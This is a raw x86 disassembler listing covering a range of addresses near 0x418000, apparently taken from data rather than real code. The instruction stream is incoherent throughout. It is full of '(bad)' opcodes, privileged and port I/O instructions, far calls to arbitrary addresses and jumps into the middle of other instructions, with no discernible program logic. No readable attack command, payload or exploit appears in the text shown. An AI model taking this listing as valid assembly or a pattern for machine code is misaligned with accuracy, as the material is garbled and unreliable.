  41815b:	test   BYTE PTR ds:0xd25889e8,dl
  418161:	in     al,0x16
  418163:	lods   al,BYTE PTR ds:[esi]
  418164:	adc    eax,0xf5d64a7a
  418169:	call   0xaaeacbd1
  41816e:	sub    ecx,DWORD PTR [edx-0x2575dda1]
  418174:	(bad)  
  418175:	sub    eax,0xfc7b351
  41817a:	loope  0x418145
  41817c:	and    dl,BYTE PTR [esp+ebp*4-0x68]
  418180:	popa   
  418181:	imul   BYTE PTR [ebx]
  418183:	mov    bh,dh
  418185:	dec    ebp
  418186:	mov    al,BYTE PTR [eax+0xfc54c90]
  41818c:	fs ret 
  41818e:	or     ebp,DWORD PTR [edx+edx*2]
  418191:	mov    DWORD PTR [edi+ecx*1+0x635bbecb],edi
  418198:	push   edi
  418199:	and    BYTE PTR [esp+edi*1+0x2eda0e17],ah
  4181a0:	imul   ebx,eax,0xffffffee
  4181a3:	imul   ecx,DWORD PTR [esi],0x2d
  4181a6:	cmp    eax,0xdfaabb27
  4181ab:	nop
  4181ac:	cld    
  4181ad:	or     eax,0xff742b91
  4181b2:	add    ebp,DWORD PTR [edx]
  4181b4:	stos   BYTE PTR es:[edi],al
  4181b5:	jmp    0x41816f
  4181b7:	rdmsr  
  4181b9:	jo     0x418160
  4181bb:	shr    BYTE PTR [edi+0x6f24f045],cl
  4181c1:	adc    al,0xc2
  4181c3:	pop    ebx
  4181c4:	(bad)  
  4181c5:	and    DWORD PTR [eax+0x2a33dbfd],eax
  4181cb:	inc    ecx
  4181cc:	iret   
  4181cd:	in     al,0xab
  4181cf:	jbe    0x4181fc
  4181d1:	mov    esi,0xfc1e3b7
  4181d6:	jge    0x418236
  4181d8:	out    0x3f,eax
  4181da:	cmp    DWORD PTR gs:[ecx],0xffffffaf
  4181de:	xchg   DWORD PTR [edx],ebx
  4181e0:	or     bl,BYTE PTR [edi]
  4181e2:	std    
  4181e3:	mov    esi,DWORD PTR [edi+eax*8+0x3dcc8d08]
  4181ea:	fdivr  DWORD PTR [esi+eiz*8-0xe]
  4181ee:	pop    ds
  4181ef:	jno    0x41822f
  4181f1:	add    BYTE PTR ds:0x38670b21,ah
  4181f7:	(bad)  
  4181f8:	fnstenv [esp+eax*4-0x6f3f41dd]
  4181ff:	jnp    0x4181e7
  418201:	jnp    0x4181dd
  418203:	dec    ebp
  418204:	dec    edi
  418205:	out    dx,al
  418206:	push   ebp
  418207:	jle    0x418224
  418209:	lahf   
  41820a:	pop    es
  41820b:	rcl    BYTE PTR [ecx-0x6bc3f031],0x17
  418212:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418213:	xchg   esi,eax
  418214:	std    
  418215:	test   eax,esp
  418217:	mov    esp,0x233c7040
  41821c:	outs   dx,DWORD PTR ds:[esi]
  41821d:	test   al,0x69
  41821f:	std    
  418220:	ins    DWORD PTR es:[edi],dx
  418221:	shl    BYTE PTR [ecx-0x60],1
  418224:	test   dl,dh
  418226:	pusha  
  418227:	xchg   edi,eax
  418228:	clc    
  418229:	dec    esi
  41822a:	sbb    DWORD PTR [ecx-0x60],esi
  41822d:	std    
  41822e:	lods   al,BYTE PTR ds:[esi]
  41822f:	rol    BYTE PTR [edx],cl
  418231:	xchg   BYTE PTR [ecx-0x6b81b9ca],al
  418237:	int    0x47
  418239:	xchg   esi,eax
  41823a:	sahf   
  41823b:	mov    ah,0xf9
  41823d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41823e:	hlt    
  41823f:	jg     0x4181c5
  418241:	push   ss
  418242:	std    
  418243:	mov    ah,0x76
  418245:	adc    al,0x3
  418247:	stos   DWORD PTR es:[edi],eax
  418248:	inc    eax
  418249:	arpl   WORD PTR [edx+0x2],bx
  41824c:	in     eax,0xf9
  41824e:	sar    DWORD PTR [ebx],1
  418250:	cwde   
  418251:	adc    eax,0x74e6160c
  418256:	add    ebx,DWORD PTR [ebp+0x735844f1]
  41825c:	jle    0x41823c
  41825e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41825f:	push   ds
  418260:	pop    edx
  418261:	push   0xd4ed934e
  418266:	xchg   esp,eax
  418267:	or     cl,BYTE PTR [eax-0x5e5d7673]
  41826d:	sbb    ah,BYTE PTR [ebx-0x72]
  418270:	jb     0x418206
  418272:	es jle 0x4182bb
  418275:	loopne 0x418237
  418277:	sub    eax,0x8e854ebc
  41827c:	ins    BYTE PTR es:[edi],dx
  41827d:	lea    edx,ds:0xcea2046
  418283:	fwait
  418284:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418285:	popf   
  418286:	xor    al,0xa4
  418288:	xchg   esi,eax
  418289:	imul   esi,DWORD PTR ds:0x12e3af36,0x8
  418290:	jne    0x418310
  418292:	loopne 0x418311
  418294:	fnstcw WORD PTR [ecx+0x3d]
  418297:	cld    
  418298:	add    DWORD PTR [esi+0x2a],ecx
  41829b:	xchg   edi,eax
  41829c:	jecxz  0x418318
  41829e:	adc    DWORD PTR [ecx+0x1],edx
  4182a1:	xchg   BYTE PTR [ecx-0x2e741854],bh
  4182a7:	(bad)  
  4182a8:	sbb    eax,0xce192270
  4182ad:	rcr    BYTE PTR [ebx+0x6c77c173],0x58
  4182b4:	inc    ebp
  4182b5:	test   al,0xa0
  4182b7:	xchg   esi,eax
  4182b8:	or     al,0x28
  4182ba:	cli    
  4182bb:	pop    ss
  4182bc:	mov    WORD PTR [esi-0x686fcd59],?
  4182c2:	ins    DWORD PTR es:[edi],dx
  4182c3:	and    ah,BYTE PTR [ecx]
  4182c5:	mov    eax,0x7e9ec0
  4182ca:	dec    ebx
  4182cb:	mov    DWORD PTR [ebx],edx
  4182cd:	sub    al,0xea
  4182cf:	stos   BYTE PTR es:[edi],al
  4182d0:	inc    DWORD PTR [eax+esi*8-0x7c]
  4182d4:	repz out 0xb9,eax
  4182d7:	xor    ebx,eax
  4182d9:	jmp    0x2be1:0xc9b0d8a9
  4182e0:	pop    ebx
  4182e1:	out    0xcc,al
  4182e3:	mov    al,0x22
  4182e5:	out    dx,eax
  4182e6:	scas   al,BYTE PTR es:[edi]
  4182e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182e8:	sbb    al,ah
  4182ea:	xor    DWORD PTR [edx+ebx*4+0x79f14763],edi
  4182f1:	or     DWORD PTR [ecx-0x54445893],0xfffffff7
  4182f8:	mov    esi,DWORD PTR [ecx+0x3a]
  4182fb:	js     0x4182d0
  4182fd:	mov    cl,0xff
  4182ff:	xchg   esp,eax
  418300:	dec    DWORD PTR [si]
  418303:	mov    bl,0x96
  418305:	ja     0x41834b
  418307:	jl     0x4182cd
  418309:	xor    al,0x79
  41830b:	dec    eax
  41830c:	or     DWORD PTR es:[ecx+0x2cd7ce3d],0x153b4f5c
  418317:	cld    
  418318:	pop    ebp
  418319:	cdq    
  41831a:	and    BYTE PTR [edi-0xf209ab],ch
  418320:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418321:	sbb    cl,BYTE PTR [ebp+0x57]
  418324:	xchg   esp,eax
  418325:	push   esp
  418326:	aam    0xbb
  418328:	sub    eax,0xc60e00e5
  41832d:	mov    ds,eax
  41832f:	dec    BYTE PTR [eax]
  418331:	lods   al,BYTE PTR ds:[esi]
  418332:	inc    edi
  418333:	jmp    0xf72cc940
  418338:	std    
  418339:	jle    0x41836f
  41833b:	sbb    esp,DWORD PTR [ebx]
  41833d:	sbb    BYTE PTR [edx],dh
  41833f:	cwde   
  418340:	cmp    al,0xf7
  418342:	in     eax,dx
  418343:	stos   DWORD PTR es:[edi],eax
  418344:	imul   ecx,esi,0xffffffa9
  418347:	push   ebp
  418348:	or     DWORD PTR [edx+0x10],eax
  41834b:	fstp   QWORD PTR [edx-0x1f9b44a7]
  418351:	outs   dx,BYTE PTR ds:[esi]
  418352:	xchg   edi,eax
  418353:	lahf   
  418354:	sti    
  418355:	mov    dh,0xae
  418357:	lds    esi,FWORD PTR [edx]
  418359:	mov    BYTE PTR [edi],cl
  41835b:	lods   eax,DWORD PTR ds:[esi]
  41835c:	xor    bh,BYTE PTR [edi+0x6f129fdf]
  418362:	test   ebp,0x512fff30
  418368:	test   al,0x4a
  41836a:	jbe    0x4182f4
  41836c:	adc    DWORD PTR [eax],eax
  41836e:	cwde   
  41836f:	sub    BYTE PTR [edi+0x20],dh
  418372:	inc    esp
  418373:	cdq    
  418374:	jl     0x418317
  418376:	imul   BYTE PTR [edx-0x2b]
  418379:	jmp    0x4183b4
  41837b:	sahf   
  41837c:	xor    edi,DWORD PTR [ebx]
  41837e:	or     ebx,ecx
  418380:	iret   
  418381:	mov    esp,0x370c4ae5
  418386:	sbb    ebp,DWORD PTR [eax+0x2a]
  418389:	fst    QWORD PTR [ebx]
  41838b:	sub    dh,BYTE PTR [esi]
  41838d:	std    
  41838e:	outs   dx,DWORD PTR ds:[esi]
  41838f:	sub    BYTE PTR [eax+0x397400b9],al
  418395:	pop    edx
  418396:	jnp    0x4183fb
  418398:	popf   
  418399:	fistp  DWORD PTR ds:0xb2218c6a
  41839f:	push   edi
  4183a0:	sbb    ecx,0xa0ac1111
  4183a6:	mov    ds:0x33961995,al
  4183ab:	xor    BYTE PTR [esp-0x2fba8291],cl
  4183b2:	cmc    
  4183b3:	out    0xc7,al
  4183b5:	popa   
  4183b6:	sub    al,0xca
  4183b8:	dec    ecx
  4183b9:	jno    0x4183c2
  4183bb:	add    eax,DWORD PTR [edx+0x65]
  4183be:	les    eax,FWORD PTR [ecx+0x2b]
  4183c1:	sbb    DWORD PTR [ebx],ebx
  4183c3:	mov    ss,WORD PTR [edi-0x31e2fa74]
  4183c9:	mov    cl,0x8d
  4183cb:	push   ebp
  4183cc:	test   BYTE PTR [eax-0x6c4092a4],dl
  4183d2:	or     al,0x74
  4183d4:	mov    al,0xfd
  4183d6:	std    
  4183d7:	jo     0x418397
  4183d9:	jae    0x41838e
  4183db:	(bad)  
  4183dc:	or     al,ch
  4183de:	mov    bl,0x33
  4183e0:	xlat   BYTE PTR ds:[ebx]
  4183e1:	xor    BYTE PTR [edi-0x6af02843],bl
  4183e7:	adc    ebx,edi
  4183e9:	shr    DWORD PTR ds:0xed53758a,cl
  4183ef:	xor    cl,BYTE PTR [edx-0x2e]
  4183f2:	add    DWORD PTR [ebp-0x6f],ebx
  4183f5:	bound  ebp,QWORD PTR [eax]
  4183f7:	cdq    
  4183f8:	out    dx,eax
  4183f9:	mov    bl,0x8d
  4183fb:	add    al,0x3b
  4183fd:	add    BYTE PTR [ebp+esi*1-0x68],bh
  418401:	inc    ecx
  418402:	fld    QWORD PTR [ebx-0x73]
  418405:	sti    
  418406:	mov    ebp,0x38f87312
  41840b:	push   esp
  41840c:	mov    eax,0x9975d70d
  418411:	jmp    0xf7e5eb6
  418416:	or     eax,0xcf2518f5
  41841b:	mov    eax,ecx
  41841d:	ins    BYTE PTR es:[edi],dx
  41841e:	dec    eax
  41841f:	push   ebp
  418420:	mov    eax,0x642457ea
  418425:	jne    0x4183c0
  418427:	jne    0x4183b4
  418429:	inc    ebx
  41842a:	dec    edx
  41842b:	loope  0x4183b1
  41842d:	push   edi
  41842e:	cdq    
  41842f:	pop    es
  418430:	cmp    BYTE PTR [esi-0x4a],cl
  418433:	cmp    esp,DWORD PTR [ecx-0x67]
  418436:	pushf  
  418437:	int    0x9f
  418439:	int3   
  41843a:	xchg   BYTE PTR [esi],bh
  41843c:	mov    esp,0x382d2a8
  418441:	add    edx,DWORD PTR [ecx]
  418443:	addr16 mov bh,0x1f
  418446:	addr16 inc esi
  418448:	pop    ss
  418449:	xchg   ebx,eax
  41844a:	ja     0x418432
  41844c:	pop    eax
  41844d:	pop    edx
  41844e:	jo     0x41844c
  418450:	test   al,0xae
  418452:	lock leave 
  418454:	repnz mov ecx,DWORD PTR [eax]
  418457:	add    DWORD PTR [ecx],esi
  418459:	clc    
  41845a:	pop    ebx
  41845b:	push   es
  41845c:	mov    edx,0x44de3c9e
  418461:	cmp    eax,0x948fc005
  418466:	mov    bl,BYTE PTR [edi+ebp*2]
  418469:	inc    ebx
  41846a:	inc    eax
  41846b:	mov    DWORD PTR [edx],ebp
  41846d:	dec    ebx
  41846e:	and    DWORD PTR [edx],edx
  418470:	icebp  
  418471:	push   cs
  418472:	pop    esi
  418473:	xor    al,0x99
  418475:	hlt    
  418476:	xchg   ecx,eax
  418477:	(bad)  
  418479:	test   BYTE PTR [esi-0x2763cf06],dl
  41847f:	jmp    0x41845e
  418481:	stc    
  418482:	mov    ecx,0xc12e7a53
  418487:	ds (bad) 
  418489:	adc    al,BYTE PTR [edx+0x7fdeeae4]
  41848f:	jl     0x4184f1
  418491:	mov    esi,0xeed4fbe7
  418496:	(bad)  
  418497:	bnd call 0xcd9449b0
  41849d:	rol    dl,cl
  41849f:	jns    0x4184ed
  4184a1:	lods   eax,DWORD PTR ds:[esi]
  4184a2:	mov    dh,ah
  4184a4:	adc    ebx,DWORD PTR [ecx]
  4184a6:	ss fs or cl,ch
  4184aa:	daa    
  4184ab:	mov    eax,0xeee34714
  4184b0:	adc    al,0x31
  4184b2:	addr16 sti 
  4184b4:	das    
  4184b5:	(bad)  [eax]
  4184b7:	pop    ds
  4184b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184b9:	in     al,0xa7
  4184bb:	add    al,0x88
  4184bd:	adc    bl,BYTE PTR [edx+0x7ec40cad]
  4184c3:	ret    0xb95
  4184c6:	scas   al,BYTE PTR es:[edi]
  4184c7:	jae    0x4184a8
  4184c9:	sbb    BYTE PTR [eax+eiz*2+0x3c],dh
  4184cd:	jae    0x4184e8
  4184cf:	imul   DWORD PTR [ebx-0x44319929]
  4184d5:	cmp    eax,0x10e604ad
  4184da:	stos   BYTE PTR es:[edi],al
  4184db:	pop    ebx
  4184dc:	mov    ds:0xa3ae0a0f,al
  4184e1:	cmc    
  4184e2:	in     al,0x1a
  4184e4:	mov    ebp,0x6d29a52a
  4184e9:	sub    al,0x72
  4184ec:	imul   edi,DWORD PTR [ecx-0x66b5fe2],0x89c2ffcf
  4184f6:	and    al,BYTE PTR [eax+0x7d10d11b]
  4184fc:	mov    ebx,0x9aa4aec5
  418501:	push   edx
  418502:	jp     0x4184f6
  418504:	fiadd  DWORD PTR [edi]
  418506:	fild   QWORD PTR [eax+eiz*2-0x6d]
  41850a:	retf   0x1ba4
  41850d:	dec    edi
  41850e:	or     ah,al
  418510:	loope  0x4184c2
  418512:	cld    
  418513:	sbb    DWORD PTR [eax],edx
  418515:	stc    
  418516:	or     ebx,DWORD PTR [edi-0x236d329c]
  41851c:	(bad)  
  41851d:	push   eax
  41851e:	mov    bh,0x93
  418520:	fdiv   st,st(0)
  418522:	idiv   DWORD PTR [esi]
  418524:	push   es
  418525:	adc    BYTE PTR [eax-0x4217aead],dh
  41852b:	scas   eax,DWORD PTR es:[edi]
  41852c:	add    al,BYTE PTR [ebx]
  41852e:	add    ebx,ebp
  418530:	clc    
  418531:	push   ds
  418532:	retf   
  418533:	fisubr WORD PTR [eax+0x70f2e5e8]
  418539:	nop
  41853a:	push   DWORD PTR [esi+eax*1]
  41853d:	xor    cl,BYTE PTR [ebp+ebp*4+0x5d]
  418541:	xchg   esi,eax
  418542:	xchg   esi,eax
  418543:	fistp  QWORD PTR [ebx+edi*1]
  418546:	add    al,0xca
  418548:	cdq    
  418549:	inc    edx
  41854a:	mov    esi,DWORD PTR [edi+0x4648ca57]
  418550:	inc    ebp
  418551:	mov    ebp,0xa6a57c41
  418556:	pop    es
  418557:	inc    eax
  418558:	mov    WORD PTR [esi],?
  41855a:	cmp    al,0x3c
  41855c:	lods   al,BYTE PTR ds:[esi]
  41855d:	into   
  41855e:	dec    edi
  41855f:	shl    DWORD PTR [ebp-0x24],0xed
  418563:	dec    ecx
  418564:	popf   
  418565:	iret   
  418566:	cdq    
  418567:	sti    
  418568:	sbb    BYTE PTR [ecx-0x78740229],dl
  41856e:	(bad)  
  41856f:	enter  0x86d9,0x5f
  418573:	xchg   esi,eax
  418574:	aad    0x1c
  418576:	mov    BYTE PTR [eax-0x65],ch
  418579:	cmp    al,0xe5
  41857b:	add    eax,esp
  41857d:	ja     0x418560
  41857f:	mov    al,0xd4
  418581:	mov    eax,0x70e95461
  418586:	adc    DWORD PTR [edi-0x6f],ebp
  418589:	push   ebp
  41858a:	push   edx
  41858b:	mov    ebx,0x91856a2b
  418590:	(bad)  
  418591:	pop    ebp
  418592:	test   al,0xcf
  418594:	arpl   WORD PTR [esp],dx
  418597:	cmp    ecx,0x2377190
  41859d:	popa   
  41859e:	xor    cl,BYTE PTR [edx-0x5c]
  4185a1:	jp     0x418560
  4185a3:	mov    ah,0xb0
  4185a5:	shl    BYTE PTR [edi],0xca
  4185a8:	mov    cl,0x3c
  4185aa:	mov    ds:0xd386a93c,al
  4185af:	inc    esi
  4185b0:	inc    eax
  4185b1:	addr16 dec esi
  4185b3:	ror    BYTE PTR [edi],cl
  4185b5:	adc    edx,edx
  4185b7:	mov    ebp,0x2e849198
  4185bc:	hlt    
  4185bd:	sbb    eax,0x6f4dacff
  4185c2:	push   ebx
  4185c3:	cmc    
  4185c4:	mov    dh,0xdb
  4185c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185c7:	std    
  4185c8:	or     BYTE PTR [ebx+0x3233d3c],dl
  4185ce:	or     al,0x5a
  4185d0:	sbb    bh,BYTE PTR [eax-0x9a800f6]
  4185d6:	sub    edi,esi
  4185d8:	rcl    BYTE PTR [edi],1
  4185da:	(bad)  [ebp+0x25221f1b]
  4185e0:	pop    es
  4185e1:	push   0xa
  4185e3:	mov    edx,edi
  4185e5:	sub    al,0x2d
  4185e7:	aas    
  4185e8:	rcpps  xmm1,XMMWORD PTR [ecx+0x3549b440]
  4185ef:	aas    
  4185f0:	test   DWORD PTR cs:[eax+0x4e],ebx
  4185f4:	(bad)  
  4185f5:	mov    ecx,0x955fd6b9
  4185fa:	pop    ebx
  4185fb:	push   es
  4185fc:	jne    0x418657
  4185fe:	js     0x4185e7
  418600:	pop    ss
  418601:	jae    0x41860c
  418603:	bound  esi,QWORD PTR [ebp*8+0x20e62e94]
  41860a:	inc    edi
  41860b:	outs   dx,DWORD PTR ds:[esi]
  41860c:	fbstp  TBYTE PTR [eiz*4-0x57283531]
  418613:	sbb    eax,0x637c796d
  418618:	and    DWORD PTR [edx+0x6b],ecx
  41861b:	pop    ss
  41861c:	ja     0x4185e7
  41861e:	xor    ebp,edi
  418620:	out    0x8e,eax
  418622:	int    0x88
  418624:	fld    QWORD PTR [eax+0x7b]
  418627:	scas   eax,DWORD PTR es:[edi]
  418628:	scas   eax,DWORD PTR es:[edi]
  418629:	or     BYTE PTR [eax-0x34a5a1be],ah
  41862f:	mov    BYTE PTR [esi],cl
  418631:	out    dx,al
  418632:	mov    edx,0x35fbc45b
  418637:	dec    ebx
  418638:	xor    eax,0x3188f094
  41863d:	push   DWORD PTR [edi-0x73]
  418640:	add    DWORD PTR gs:[edi+0x4f],edx
  418644:	pop    edi
  418645:	sub    DWORD PTR [ecx+0x23],0x3c
  418649:	inc    ebx
  41864a:	cli    
  41864b:	add    eax,0xbc9182c
  418650:	push   0xd2c9e73b
  418655:	ja     0x418635
  418657:	mov    ch,0x48
  418659:	cmp    eax,0x7700aa99
  41865e:	fmul   DWORD PTR [edi]
  418660:	jl     0x4186a8
  418662:	push   cs
  418663:	cmp    BYTE PTR [edx+0x10d0c412],ah
  418669:	xor    dh,ch
  41866b:	(bad)  
  41866c:	xchg   ecx,eax
  41866d:	aad    0x9a
  41866f:	test   BYTE PTR [edx+eiz*8-0x6ed83c32],dh
  418676:	mov    eax,0xbdfc50b5
  41867b:	ror    BYTE PTR [ebp-0x2873a915],0x70
  418682:	stos   BYTE PTR es:[edi],al
  418683:	jnp    0x41860f
  418685:	mov    eax,ds:0xfa3090c9
  41868a:	sbb    eax,0x679bca68
  41868f:	popw   ss
  418691:	mov    ds:0x153a866c,eax
  418696:	jbe    0x418673
  418698:	adc    al,0xb3
  41869a:	rol    BYTE PTR [ebp+0x43],0x95
  41869e:	std    
  41869f:	add    dh,BYTE PTR [ebx-0x387a463a]
  4186a5:	out    dx,al
  4186a6:	jne    0x41868a
  4186a8:	je     0x41871e
  4186aa:	xchg   esp,eax
  4186ab:	hlt    
  4186ac:	mov    al,0x98
  4186ae:	xchg   ebp,eax
  4186af:	and    BYTE PTR [ecx],dh
  4186b1:	lods   eax,DWORD PTR ds:[esi]
  4186b2:	sbb    dh,bh
  4186b4:	mov    ah,0x87
  4186b6:	xor    al,BYTE PTR [ebx-0x3368232e]
  4186bc:	cmp    DWORD PTR [esi-0x6],edx
  4186bf:	bswap  ebp
  4186c1:	ss retf 
  4186c3:	mov    al,ds:0x7329fd5b
  4186c8:	sbb    eax,0x6152e1d8
  4186cd:	mul    DWORD PTR [edi+esi*8+0x36]
  4186d1:	push   esp
  4186d2:	mov    edx,0xe1b4898d
  4186d7:	in     eax,dx
  4186d8:	mov    bh,0x2d
  4186da:	nop
  4186db:	ins    DWORD PTR es:[edi],dx
  4186dc:	enter  0x8357,0xcd
  4186e0:	or     ah,BYTE PTR [edx+0x51]
  4186e3:	dec    ebp
  4186e4:	test   al,0x98
  4186e6:	xor    DWORD PTR [ecx+0x658ad275],ebp
  4186ec:	adc    cl,BYTE PTR [ebx+edx*4-0x55f39cdd]
  4186f3:	adc    DWORD PTR [ecx+0x2c3380e7],ebx
  4186f9:	push   esp
  4186fa:	push   esi
  4186fb:	pop    esi
  4186fc:	fstp   DWORD PTR [edx+0x32825dd6]
  418702:	adc    al,BYTE PTR [ebx+edx*8]
  418705:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  418707:	ins    BYTE PTR es:[edi],dx
  418708:	inc    esi
  418709:	jmp    0xab00bfc2
  41870e:	xchg   edi,eax
  41870f:	pushf  
  418710:	xchg   DWORD PTR [ebp+0x5352b890],edx
  418716:	div    BYTE PTR [ebp-0x528a6d81]
  41871c:	push   0x6730f5
  418721:	dec    ecx
  418722:	inc    ecx
  418723:	adc    eax,0x20f1b58e
  418728:	mov    esi,0xa4656753
  41872d:	sbb    eax,0xb1fb9
  418732:	jnp    0x4186dd
  418734:	xor    BYTE PTR [esi-0x31],0xe6
  418738:	jo     0x418704
  41873a:	sbb    edx,DWORD PTR [ebp+0x54]
  41873d:	pop    ss
  41873e:	fsub   st(3),st
  418740:	mov    eax,0x42caf04e
  418745:	cld    
  418746:	inc    ebx
  418747:	sbb    eax,0x32c3756c
  41874c:	cmp    ebx,DWORD PTR [edx+0x2c]
  41874f:	cmc    
  418750:	call   0xf88e:0x804c92fd
  418757:	mov    DWORD PTR [ebp+ebx*4-0x28],eax
  41875b:	pop    edi
  41875c:	sbb    ch,cl
  41875e:	pop    edx
  41875f:	mov    ah,0x83
  418761:	xor    al,0x22
  418763:	les    ebp,FWORD PTR [edx-0x4487a837]
  418769:	mov    bh,0xc1
  41876b:	push   ds
  41876c:	mov    bh,0x28
  41876e:	repz (bad) 
  418770:	inc    eax
  418771:	sbb    al,0xa4
  418773:	cwde   
  418774:	mov    ecx,ebp
  418776:	mov    DWORD PTR [esi+0x5d],ebp
  418779:	dec    esp
  41877a:	xchg   BYTE PTR [edx],cl
  41877c:	stos   BYTE PTR es:[edi],al
  41877d:	and    edx,DWORD PTR ds:0xc02e9fce
  418783:	scas   al,BYTE PTR es:[edi]
  418784:	pop    edi
  418785:	scas   al,BYTE PTR es:[edi]
  418786:	add    cl,BYTE PTR [edi-0x63328fce]
  41878c:	mov    edi,0xb20e61b0
  418791:	dec    eax
  418792:	jae    0x4187c0
  418794:	or     eax,0x885386f6
  418799:	sub    edi,DWORD PTR [ebp+0x4e]
  41879c:	jge    0x41877b
  41879e:	cmp    eax,DWORD PTR [eax]
  4187a0:	fcom   DWORD PTR gs:[esi]
  4187a3:	sbb    eax,DWORD PTR [eax+0x41]
  4187a6:	pop    edi
  4187a7:	adc    al,0x4b
  4187a9:	jno    0x4187fd
  4187ab:	inc    ebp
  4187ac:	xchg   BYTE PTR [edx+esi*2],dh
  4187af:	outs   dx,BYTE PTR ds:[esi]
  4187b0:	mov    ebx,0x2cf404c6
  4187b5:	cmp    DWORD PTR [ebx+0x60645836],edi
  4187bb:	retf   
  4187bc:	push   eax
  4187bd:	cs pop eax
  4187bf:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4187c1:	je     0x41874f
  4187c3:	inc    ebx
  4187c4:	aas    
  4187c5:	fidiv  DWORD PTR ds:0x1186c787
  4187cb:	jae    0x4187eb
  4187cd:	pop    esi
  4187ce:	or     BYTE PTR [ecx-0x69c03552],al
  4187d4:	xor    ebp,0xa63f9464
  4187da:	mov    WORD PTR [ebp-0x14],gs
  4187dd:	aas    
  4187de:	mov    ebp,0xc1a17bef
  4187e3:	out    0x14,al
  4187e5:	pop    es
  4187e6:	int    0xfa
  4187e8:	fldcw  WORD PTR [edx-0x250d66fd]
  4187ee:	int3   
  4187ef:	test   BYTE PTR [eax],ah
  4187f1:	xor    eax,0xec2ea74
  4187f6:	cmp    DWORD PTR [esi-0x7dd6d124],eax
  4187fc:	mov    edi,0x6d9b7da9
  418801:	and    dh,BYTE PTR [ebp-0x585ba7e5]
  418807:	adc    al,0x92
  418809:	and    al,al
  41880b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41880c:	lods   al,BYTE PTR ds:[esi]
  41880d:	jecxz  0x4187c5
  41880f:	mov    edi,0x410b4c36
  418814:	cld    
  418815:	adc    bl,ch
  418817:	loope  0x418802
  418819:	push   ebx
  41881a:	push   edx
  41881b:	or     dl,BYTE PTR [esi+0x45]
  41881e:	pop    ebx
  41881f:	jle    0x4187b9
  418821:	mov    ebx,0x53761306
  418826:	push   edi
  418827:	dec    ebp
  418828:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418829:	add    ecx,eax
  41882b:	mov    DWORD PTR [ecx-0x27b90f1c],esi
  418831:	inc    eax
  418832:	jb     0x418822
  418834:	test   eax,0xd7ee6917
  418839:	fild   WORD PTR [esi-0x57]
  41883c:	stc    
  41883d:	inc    ebp
  41883e:	sbb    DWORD PTR [ecx+eiz*1-0x10],ebx
  418842:	out    dx,al
  418843:	repnz in eax,0xa4
  418846:	cmp    ch,bh
  418848:	add    cl,BYTE PTR [ebp+0x50]
  41884b:	rol    BYTE PTR [ebx],0x79
  41884e:	pop    ds
  41884f:	fdivr  QWORD PTR [eax]
  418851:	lahf   
  418852:	or     dl,BYTE PTR [ebp-0x2d6fc5c3]
  418858:	push   esp
  418859:	inc    ebx
  41885a:	adc    DWORD PTR [ebp+edx*1+0x4b],esp
  41885e:	es cmp esi,eax
  418861:	lock loope 0x418880
  418864:	pop    edi
  418865:	cmc    
  418866:	inc    ebx
  418867:	cmp    esp,ebp
  418869:	ds pop ss
  41886b:	adc    dh,BYTE PTR [ebp+0x23]
  41886e:	and    eax,0xc5fc5db5
  418873:	test   DWORD PTR [ebx],esp
  418875:	cmp    eax,0xa536bf60
  41887a:	pop    ebx
  41887b:	inc    edx
  41887c:	mov    esp,0xef288d23
  418881:	add    BYTE PTR [ecx-0x2b7895b8],cl
  418887:	sub    ch,BYTE PTR [edi]
  418889:	sbb    dl,BYTE PTR ds:0xd301d5e4
  41888f:	ins    BYTE PTR es:[edi],dx
  418890:	iret   
  418891:	loop   0x418845
  418893:	call   0x76de3dca
  418898:	push   0xffffffcf
  41889a:	or     BYTE PTR [esi-0x76437486],ah
  4188a0:	push   ebp
  4188a1:	aas    
  4188a2:	ret    
  4188a3:	pop    edi
  4188a4:	sub    ah,ah
  4188a6:	test   eax,0x35f612cb
  4188ab:	adc    BYTE PTR [edi],0x5
  4188ae:	mov    cl,0x18
  4188b0:	mov    edi,0xa02ebdbb
  4188b5:	xor    al,0xb
  4188b7:	add    eax,0xfdeccef3
  4188bc:	sar    edi,0x3e
  4188bf:	out    0x4e,eax
  4188c1:	push   0xffffffd3
  4188c3:	rol    DWORD PTR [ebx],cl
  4188c5:	not    BYTE PTR [esi+0x512c2552]
  4188cb:	cmc    
  4188cc:	call   0xe5474103
  4188d1:	pop    ebp
  4188d2:	pusha  
  4188d3:	dec    DWORD PTR [esi+0x5f26e90c]
  4188d9:	jno    0x418914
  4188db:	mov    dl,0xf1
  4188dd:	(bad)  
  4188de:	aam    0x85
  4188e0:	js     0x4188d0
  4188e2:	fcomp  QWORD PTR [edi]
  4188e4:	in     al,0x20
  4188e6:	aaa    
  4188e7:	call   0xefc3:0x866d8259
  4188ee:	repz imul esi,DWORD PTR [esi+0x4],0x4
  4188f3:	pop    es
  4188f4:	fimul  WORD PTR [ebp+0x7086276]
  4188fa:	pavgw  mm6,QWORD PTR [eax]
  4188fd:	div    BYTE PTR [edx-0x61]
  418900:	xor    ecx,DWORD PTR [bx+di]
  418903:	jp     0x4188c9
  418905:	add    DWORD PTR [edx-0xf82832d],esp
  41890b:	mov    dh,0xc6
  41890d:	retf   0x4fe9
  418910:	call   0xbc96:0x51198e78
  418917:	test   BYTE PTR [esi+ebp*1+0x7e],0x2f
  41891c:	lock nop esp
  418920:	xor    BYTE PTR [eax+0x6ea6e76f],ah
  418926:	pop    es
  418927:	int3   
  418928:	sti    
  418929:	test   bh,ah
  41892b:	std    
  41892c:	push   ecx
  41892d:	cmc    
  41892e:	pop    ss
  41892f:	int3   
  418930:	sbb    BYTE PTR ds:0x1ed8efb3,ah
  418936:	mov    al,ds:0xa1bffdda
  41893b:	and    DWORD PTR [ebp+0x42],edi
  41893e:	mov    edx,DWORD PTR [edx-0x25]
  418941:	addr16 push esp
  418943:	pusha  
  418944:	call   FWORD PTR [eax+0x15aecaf3]
  41894a:	push   esp
  41894b:	fwait
